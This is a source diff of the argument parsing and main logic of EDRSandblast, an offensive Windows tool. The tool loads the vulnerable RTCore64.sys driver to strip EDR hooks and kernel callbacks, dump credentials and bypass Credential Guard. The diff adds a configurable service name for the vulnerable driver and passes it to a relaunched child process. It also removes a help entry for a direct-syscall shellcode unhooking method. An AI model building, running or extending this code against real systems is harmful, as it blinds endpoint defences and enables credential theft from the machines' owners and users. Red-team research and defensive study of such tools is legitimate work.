@@ -6,27 +6,9 @@
 
 */
 
-static TCHAR* randString(TCHAR* str, size_t size)
-{
-    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789";
-    if (size) {
-        --size;
-        for (size_t n = 0; n < size; n++) {
-            int key = rand() % (int)(sizeof charset - 1);
-            str[n] = charset[key];
-        }
-        str[size] = '\0';
-    }
-    return str;
-}
-
-const TCHAR *gVulnDriverServiceName = TEXT("RTCore64");
-
-// TCHAR* gVulnDriverServiceName;
-
 int _tmain(int argc, TCHAR** argv) {
     // Parse command line arguments and initialize variables to default values if needed.
-    const TCHAR usage[] = TEXT("Usage: EDRSandblast.exe [-h | --help] [-v | --verbose] <audit | dump | cmd | credguard> [--usermode [--unhook-method <N>]] [--kernelmode] [--dont-unload-driver] [--dont-restore-callbacks] [--driver <RTCore64.sys>] [--nt-offsets <NtoskrnlOffsets.csv>] [--wdigest-offsets <WdigestOffsets.csv>] [-o | --dump-output <DUMP_FILE>]");
+    const TCHAR usage[] = TEXT("Usage: EDRSandblast.exe [-h | --help] [-v | --verbose] <audit | dump | cmd | credguard> [--usermode [--unhook-method <N>]] [--kernelmode] [--dont-unload-driver] [--dont-restore-callbacks] [--driver <RTCore64.sys>] [--service <SERVICE_NAME>] [--nt-offsets <NtoskrnlOffsets.csv>] [--wdigest-offsets <WdigestOffsets.csv>] [-o | --dump-output <DUMP_FILE>]");
     const TCHAR extendedUsage[] = TEXT("\n\
 -h | --help             Show this help message and exit.\n\
 -v | --verbose          Enable a more verbose output.\n\
@@ -56,8 +38,6 @@ Actions mode:\n\
 \t4               Loads an additional version of ntdll library into memory, and use the (hopefully\n\
 \t                unmonitored) version of NtProtectVirtualMemory present in this library to remove all\n\
 \t                present userland hooks.\n\
-\t5               Allocates a shellcode that uses a direct syscall to call NtProtectVirtualMemory,\n\
-\t                and uses it to remove all detected hooks\n\
 \n\
 Other options:\n\
 \n\
@@ -68,6 +48,7 @@ Other options:\n\
 \n\
 --driver <RTCore64.sys>                 Path to the Micro-Star MSI Afterburner vulnerable driver file.\n\
                                         Default to 'RTCore64.sys' in the current directory.\n\
+--service <SERVICE_NAME>                Name of the vulnerable service to intall / start.\n\
 \n\
 --nt-offsets <NtoskrnlOffsets.csv>      Path to the CSV file containing the required ntoskrnl.exe's offsets.\n\
                                         Default to 'NtoskrnlOffsets.csv' in the current directory.\n\
@@ -118,10 +99,6 @@ Other options:\n\
     BOOL ETWTIState = FALSE;
     hook* hooks = NULL;
 
-    /*
-    gVulnDriverServiceName = calloc(SERVICE_NAME_LENGTH, sizeof(TCHAR));
-    randString(gVulnDriverServiceName, SERVICE_NAME_LENGTH);
-    */
 
     for (int i = 2; i < argc; i++) {
         if (_tcsicmp(argv[i], TEXT("-h")) == 0 || _tcsicmp(argv[i], TEXT("--help")) == 0) {
@@ -151,6 +128,14 @@ Other options:\n\
                 return EXIT_FAILURE;
             }
             _tcsncpy_s(driverPath, _countof(driverPath), argv[i], _tcslen(argv[i]));
+        }
+        else if (_tcsicmp(argv[i], TEXT("--service")) == 0) {
+            i++;
+            if (i > argc) {
+                _tprintf(TEXT("%s"), usage);
+                return EXIT_FAILURE;
+            }
+            SetServiceName(argv[i], _tcslen(argv[i]) + 1);
         }
         else if (_tcsicmp(argv[i], TEXT("--nt-offsets")) == 0) {
             i++;
@@ -242,7 +227,7 @@ Other options:\n\
         if (status != TRUE) {
             _tprintf(TEXT("[!] An error occurred while installing the vulnerable MSI Afterburner driver\n"));
             _tprintf(TEXT("[*] Uninstalling the service and attempting the install again...\n"));
-            Sleep(2000);
+            Sleep(20000);
             status = UninstallVulnerableDriver();
             Sleep(2000);
             status = status && InstallVulnerableDriver(driverPath);
@@ -377,7 +362,7 @@ Other options:\n\
             _tprintf(TEXT("\n\n"));
         }
         else {
-            _tprintf(TEXT("[+] Process is NOT \"safe\" to launch our payload, removing monitoring and start another process...\n"));
+            _tprintf(TEXT("[+] Process is NOT \"safe\" to launch our payload, removing monitoring and starting another process...\n"));
 #ifdef _DEBUG
             assert(kernelMode);
 #endif
@@ -436,12 +421,16 @@ Other options:\n\
             // Pass the same argument, only add the "--dont-unload-driver" flag as the vulnerable driver will still be needed by the parent process.
             TCHAR* currentCommandLine = GetCommandLine();
             TCHAR* noRemoveFlag = _tcsdup(TEXT(" --dont-unload-driver"));
+            TCHAR* serviceNameOpt = _tcsdup(TEXT(" --service "));
+            TCHAR* svcName = GetServiceName();
 
             //TODO: fix length calculation. _tcslen returns the length that should be used, but error due to "no const".
             const SIZE_T commandLineMaxLen = 32768;
-            TCHAR* commandLine = (TCHAR*)calloc(commandLineMaxLen, sizeof(TCHAR));
+            TCHAR* commandLine = (TCHAR*) calloc(commandLineMaxLen, sizeof(TCHAR));
             _tcsncat_s(commandLine, commandLineMaxLen, currentCommandLine, _tcslen(currentCommandLine));
             _tcsncat_s(commandLine, commandLineMaxLen, noRemoveFlag, _tcslen(noRemoveFlag));
+            _tcsncat_s(commandLine, commandLineMaxLen, serviceNameOpt, _tcslen(serviceNameOpt));
+            _tcsncat_s(commandLine, commandLineMaxLen, svcName, _tcslen(svcName));
 
             if (CreateProcess(argv[0], commandLine, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
                 WaitForSingleObject(pi.hProcess, INFINITE);
@@ -503,7 +492,7 @@ Other options:\n\
         status = UninstallVulnerableDriver();
         if (status == FALSE) {
             _tprintf(TEXT("[!] An error occured while attempting to uninstall the vulnerable driver\n"));
-            _tprintf(TEXT("[*] The service should be manually deleted: cmd /c sc delete %s\n"), gVulnDriverServiceName);
+            _tprintf(TEXT("[*] The service should be manually deleted: cmd /c sc delete %s\n"), serviceName);
             lpExitCode = EXIT_FAILURE;
         }
         else {
